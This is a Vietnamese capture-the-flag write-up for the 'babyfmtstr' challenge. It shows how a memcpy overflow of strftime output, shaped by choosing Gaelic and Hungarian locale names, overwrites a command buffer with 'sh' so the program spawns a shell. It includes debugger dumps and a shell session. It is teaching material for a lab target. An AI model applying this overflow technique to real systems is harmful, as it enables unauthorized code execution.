# write up babyfmtstr - fmtstr locale battle 
- first em sẽ đươc phép nhập format nhưng là format trong locale của libc nên khi qua hàm strftime nó sẽ được chuyển thành định dạng thời gian như ngày giờ, nên format string không sử dụng được như tên bài
```assembly 
00:0000│  0x5555555580e0 (output) ◂— '04/21/2404/21/2404/21/2404/21/2404/21/24%%%%%'
01:0008│  0x5555555580e8 (output+8) ◂— '04/21/2404/21/2404/21/2404/21/24%%%%%'
02:0010│  0x5555555580f0 (output+16) ◂— '04/21/2404/21/2404/21/24%%%%%'
03:0018│  0x5555555580f8 (output+24) ◂— '04/21/2404/21/24%%%%%'
04:0020│  0x555555558100 (command) ◂— '04/21/24%%%%%'
05:0028│  0x555555558108 (command+8) ◂— 0x2525252525 /* '%%%%%' */
06:0030│  0x555555558110 (command+16) ◂— 0x0
07:0038│  0x555555558118 (command+24) ◂— 0x0
```
- tiếp theo ta sẽ có hàm memcpy trong chương trình sẽ copy biến buff chứa những gì được chuyển đổi từ hàm strftime sang biến output, nhưng biến output chỉ có 0x20 bytes mà nó copy tới 0x30 nên buff xảy ra và lọt xuống biến chứa command sẽ được thực thi ở sau cùng, chính vì vậy khi em nhập format ngày giờ phải chọn đúng thì mới có thể overwrite được biến command thành sh để có shell
- vậy mục tiêu là ghi sh vào biến command vì nó là command ngắn nhất để lấy shell
```c
char output[0x20];
char command[0x20];
```
ở đây khi nhập format %A in tên ngày trong tuần thì nó chỉ có Sunday theo thời gian thực 
```bash
Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> 1
The time now is 1713717621.
Enter format specifier: %A
Formatted: Sunday
```
- khi dịch Sunday sang nhiều thứ tiếng khác nhau thì khả năng có rất nhiều thứ tiếng sẽ có chữ s và h ở cuối vì vậy cần chọn cho thích hợp 
- Sẽ có 2 chữ có chữ s và chữ h trong chuỗi và ở vị trí thích hợp:
(1.) Didòmhnaic[h] tương ứng với sunday trong tiếng anh format %A
(2.) áprili[s] tương ứng với April trong tiếng anh format %B
- có thể sẽ mất nhiều thời gian để tìm, và cũng có thể vào 1 ngày khác trong tương lai sẽ có 1 ngày như vậy, với bài này chỉ dùng được cho chủ nhật vì hiện tại người làm đang ở ngày chủ nhật 
```bash
In [13]: hex(u64(b"aaprilis"))
Out[13]: '0x73696c6972706161'
```
```bash
In [10]: hex(u64(b"ilisaich"))
Out[10]: '0x6863696173696c69'
```
- khi đổi sang hex thì sẽ có được 2 bytes cuối là 0x68 và 0x73 ghép lại là 0x6873 chính là chữ "sh"

```bash
In [5]: hex(u16(b"sh"))
Out[5]: '0x6873'
```
- vì vậy ta chỉ cần overwrite 2 bytes cuối là có thể thực thi command
- vì vậy lần đầu overwrite ta sẽ chọn chữ số (1.) để overwrite 

```assembly
pwndbg> tel &output
00:0000│  0x5555555580e0 (output) ◂— 0x34322f31322f3430 ('04/21/24')
01:0008│  0x5555555580e8 (output+8) ◂— 0x34322f31322f3430 ('04/21/24')
02:0010│  0x5555555580f0 (output+16) ◂— 0x6944252525252525 ('%%%%%%Di')
03:0018│  0x5555555580f8 (output+24) ◂— 0x69616e686db2c344
04:0020│  0x555555558100 (command) ◂— 0x6863 /* 'ch' */
```
- để write được thì cần padding thích hợp sao cho chữ bytes cuối là chữ h rơi vào chữ l của command ban đầu 

```assembly
pwndbg> tel &output
00:0000│  0x5555555580e0 (output) ◂— 0x34322f31322f3430 ('04/21/24')
01:0008│  0x5555555580e8 (output+8) ◂— 0x34322f31322f3430 ('04/21/24')
02:0010│  0x5555555580f0 (output+16) ◂— 0x34322f31322f3430 ('04/21/24')
03:0018│  0x5555555580f8 (output+24) ◂— 0x696c697270a1c325
04:0020│  0x555555558100 (command) ◂— 0x6873 /* 'sh' */
```
- tiếp theo padding nốt 1 byte còn lại là 0x73 vào là xong, ta được chuỗi sh, khi chạy command sẽ tạo ra được shell
- khi chọn option 3 thì vòng lặp while đưa chương trình vào hàm goodbye và thực thi system 
```bash

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> $ 3
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x8 bytes:
    00000000  41 64 69 c3  b3 73 21 0a                            │Adi·│·s!·│
    00000008
Adiós!
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x67 bytes:
    b'Dockerfile\t      fmtstr\tfmtstr.i64  fmtstr_patched\n'
    b'dist-baby-fmtstr.zip  fmtstr.c\tfmtstr.md   solve.py\n'
Dockerfile          fmtstr    fmtstr.i64  fmtstr_patched
dist-baby-fmtstr.zip  fmtstr.c    fmtstr.md   solve.py
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x67 bytes:
    b'Dockerfile\t      fmtstr\tfmtstr.i64  fmtstr_patched\n'
    b'dist-baby-fmtstr.zip  fmtstr.c\tfmtstr.md   solve.py\n'
Dockerfile          fmtstr    fmtstr.i64  fmtstr_patched
dist-baby-fmtstr.zip  fmtstr.c    fmtstr.md   solve.py
$  

```
## cách có được locale của 2 ngôn ngữ sử dụng
- đầu tiên edit file /etc/locale.gen uncomment 2 locales 
```bash
#gd_GB.UTF-8... done
#hu_HU.UTF-8... done

```
- gen locale
```bash
🍎 >> sudo locale-gen 
Generating locales...
  gd_GB.UTF-8... done
  hu_HU.UTF-8... done
Generation complete.

```
- check locale
```bash
🍎 >> localectl list-locales
C.UTF-8
gd_GB.UTF-8
hu_HU.UTF-8
```
```bash
[DEBUG] Received 0x12 bytes:
    b'Enter new locale: '
[DEBUG] Sent 0xb bytes:
    b'gd_GB.utf8\n'
[DEBUG] Received 0x78 bytes:
    b'Locale changed successfully!\n'
```



